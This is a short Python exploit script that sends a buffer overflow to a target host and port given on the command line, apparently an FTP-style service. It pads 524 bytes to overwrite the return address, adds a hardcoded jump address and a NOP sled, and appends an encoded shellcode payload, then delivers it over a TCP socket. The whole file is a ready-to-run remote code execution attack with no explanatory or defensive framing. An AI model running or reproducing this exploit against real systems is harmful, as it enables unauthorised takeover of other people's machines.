#!/usr/bin/python3
import sys, socket, pdb

target = sys.argv[1]
targetport = int(sys.argv[2])

if len(sys.argv) != 3:
    print('Usage: "' + sys.argv[0] + ' 0.0.0.0 21"')
    sys.exit()

# Set payload

buf =  b""
buf += b"\xdb\xcf\xd9\x74\x24\xf4\xb8\x9d\x4c\x07\xef\x5f\x33"
buf += b"\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc\x03\xda\x5f\xe5"
buf += b"\x1a\x18\xb7\x6b\xe4\xe0\x48\x0c\x6c\x05\x79\x0c\x0a"
buf += b"\x4e\x2a\xbc\x58\x02\xc7\x37\x0c\xb6\x5c\x35\x99\xb9"
buf += b"\xd5\xf0\xff\xf4\xe6\xa9\x3c\x97\x64\xb0\x10\x77\x54"
buf += b"\x7b\x65\x76\x91\x66\x84\x2a\x4a\xec\x3b\xda\xff\xb8"
buf += b"\x87\x51\xb3\x2d\x80\x86\x04\x4f\xa1\x19\x1e\x16\x61"
buf += b"\x98\xf3\x22\x28\x82\x10\x0e\xe2\x39\xe2\xe4\xf5\xeb"
buf += b"\x3a\x04\x59\xd2\xf2\xf7\xa3\x13\x34\xe8\xd1\x6d\x46"
buf += b"\x95\xe1\xaa\x34\x41\x67\x28\x9e\x02\xdf\x94\x1e\xc6"
buf += b"\x86\x5f\x2c\xa3\xcd\x07\x31\x32\x01\x3c\x4d\xbf\xa4"
buf += b"\x92\xc7\xfb\x82\x36\x83\x58\xaa\x6f\x69\x0e\xd3\x6f"
buf += b"\xd2\xef\x71\xe4\xff\xe4\x0b\xa7\x97\xc9\x21\x57\x68"
buf += b"\x46\x31\x24\x5a\xc9\xe9\xa2\xd6\x82\x37\x35\x18\xb9"
buf += b"\x80\xa9\xe7\x42\xf1\xe0\x23\x16\xa1\x9a\x82\x17\x2a"
buf += b"\x5a\x2a\xc2\xfd\x0a\x84\xbd\xbd\xfa\x64\x6e\x56\x10"
buf += b"\x6b\x51\x46\x1b\xa1\xfa\xed\xe6\x22\x0f\xfb\xeb\x32"
buf += b"\x67\xf9\xeb\x23\x24\x74\x0d\x29\xc4\xd0\x86\xc6\x7d"
buf += b"\x79\x5c\x76\x81\x57\x19\xb8\x09\x54\xde\x77\xfa\x11"
buf += b"\xcc\xe0\x0a\x6c\xae\xa7\x15\x5a\xc6\x24\x87\x01\x16"
buf += b"\x22\xb4\x9d\x41\x63\x0a\xd4\x07\x99\x35\x4e\x35\x60"
buf += b"\xa3\xa9\xfd\xbf\x10\x37\xfc\x32\x2c\x13\xee\x8a\xad"
buf += b"\x1f\x5a\x43\xf8\xc9\x34\x25\x52\xb8\xee\xff\x09\x12"
buf += b"\x66\x79\x62\xa5\xf0\x86\xaf\x53\x1c\x36\x06\x22\x23"
buf += b"\xf7\xce\xa2\x5c\xe5\x6e\x4c\xb7\xad\x8f\xaf\x1d\xd8"
buf += b"\x27\x76\xf4\x61\x2a\x89\x23\xa5\x53\x0a\xc1\x56\xa0"
buf += b"\x12\xa0\x53\xec\x94\x59\x2e\x7d\x71\x5d\x9d\x7e\x50"

buffer = b'A' * 524 # Set EIP
buffer += b"\xf3\x12\x17\x31" # Set Return address 
buffer += b"\x90" * 16 # Set NOPs
buffer += buf

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target, targetport))
s.send(buffer) # Set send payload
s.close()
